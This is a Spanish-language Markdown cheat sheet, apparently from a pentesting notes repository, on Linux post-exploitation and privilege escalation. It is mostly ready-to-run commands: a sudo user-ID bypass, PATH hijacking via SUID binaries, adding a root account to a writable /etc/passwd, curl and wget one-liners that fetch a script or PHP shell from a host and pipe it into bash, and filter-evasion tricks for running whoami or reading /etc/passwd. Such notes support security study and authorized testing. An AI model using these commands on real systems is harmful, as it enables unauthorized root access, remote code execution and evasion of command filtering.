# Linux
* [Tools](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#Tools)
* [Version Kernel](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#version-kernel)
* [Permisos de usuario](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#permisos-de-usuario)
* [PATH](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#path)
* [Permisos de archivos](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#permisos-de-archivos)
* [Procesos](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#procesos)
* [Monitoreo de red](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#Monitoreo-de-red)
* [Descargando archivos](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#Descargando-archivos)
* [Bypassing](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md#Bypassing)

## Tools

* [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [Linenum](https://github.com/rebootuser/LinEnum)
* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

## Version Kernel

### Enumeracion

```bash
uname -a
```

## Permisos de usuario

### Enumeracion

```bash
sudo -l
```

```bash
cat /etc/sudoers
```

### Explotacion de binarios con permisos para sudo

	* [GTFOBins](https://gtfobins.github.io/)

### AGREGAR CVE	

Si: ALL=(ALL:!root) NOPASSWD:ALL
```bash
sudo -u#-1 /bin/sh 
```

## PATH

### Enumeracion

```bash
echo $PATH
```

### Path: .:/bin/:

Primero busca dentro de la carpeta donde estamos parados.
1. Si podemos, encontrar un binario A con SUID que llame a otro binario B con la ruta relativa
2. Ir a una carpeta donde tengamos permiso de escritura
3. Crear un binario C malicioso con el mismo nombre que binario B
4. Ejecutar binario A

## Permisos de archivos

### Enumeracion

```bash
#Para encontrar archivos con SUID activado
find / -type f -perm -u=s 2>/dev/null

#Encontrar directorios con permisos de escritura
find / -perm 777 2>/dev/null

#SGID activado
find / -perm -g=s -type f 2>/dev/null

#Find Sticky bit
find / -perm -1000 -type d 2>/dev/null
```

### Explotacion de binarios con permisos para SUID/GUID

	* [GTFOBins]()

### passwd con permisos de escritura

```bash
#Crea password para agregar en el archivo /etc/passwd si tiene permisos de escritura
python3 -c 'import crypt; print(crypt.crypt("password", "$6$"))'

#otra opcion
openssl passwd -1


#la linea donde * es donde va la pass
hercules:*:0:0:root:/root:/bin/bash
```

## Procesos

### Enumeracion

```bash
ps aux
```

```bash
pspy32 #buscar tareas que se repitan en el tiempo
```

```bash
crontab -l
```

### Crontab

```
(1)(2)(3)(4)(5) <username> <command to be executed>
(1) Minute (0 - 59)
(2) Hour (0 - 23)
(3) Day (1 - 31)
(4) Month (1 - 12)
(5) Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)
```

## Monitoreo de red

### Netstat

```bash
netstat -antp
```

### ss

```bash
ss -antp
```

## Descargando archivos


### Server host

```bash
#En host
python -m http.server 80 #py3

python -m SimpleHTTPServer 80 #py2
```

### Cliente

#### wget

```bash
wget www.url.com/file .
```

#### Ejecutar sin descargar - Curl

```bash
curl -fsSL http://192.168.99.19:8080/test.sh | bash
```

```bash
bash < <( curl http://192.168.99.19:8080/test.sh  )
```

#### Ejecutar sin descargar - get

```bash
wget -q -O- http://192.168.99.19:8080/test.sh | bash
```

```bash
wget http://192.168.99.19:8080/shell.txt -O /tmp/x.php && php /tmp/x.php
```

## Bypassing

### Restricciones de espacios

```bash
cat$IFS/etc/passwd
```

### Usando argumento

```bash
echo $0 # es igual a /bin/bash
```

```bash
echo whoami | $0
```

### Wildcards

```bash
/usr/bin/wh?ami
/usr/bin/wh*ami
```

### Concatenaciones

```bash
'w'h'o'a'm'i
\w\h\o\a\m\i
```

### Variables sin inicializar

```bash
w${u}h${u}o${u}a${u}m${u}i
$u/usr$u/bin$u/whoami
```

### Comandos falsos

```bash
w$(u)h$(u)o$(u)a$(u)m$(u)i
w`u`h`u`o`u`a`u`m`u`i
```

### Usando History

```bash
$!-1 #Reference to last command executed. 
$!-2 #Reference to the penultimate command executed


$mi #Throw an error
$whoa #Throw an error
$!-1!-2 #Equals to whoami
```

### Nueva linea

```bash
$w\
h\
o\
a\
m\
i\
```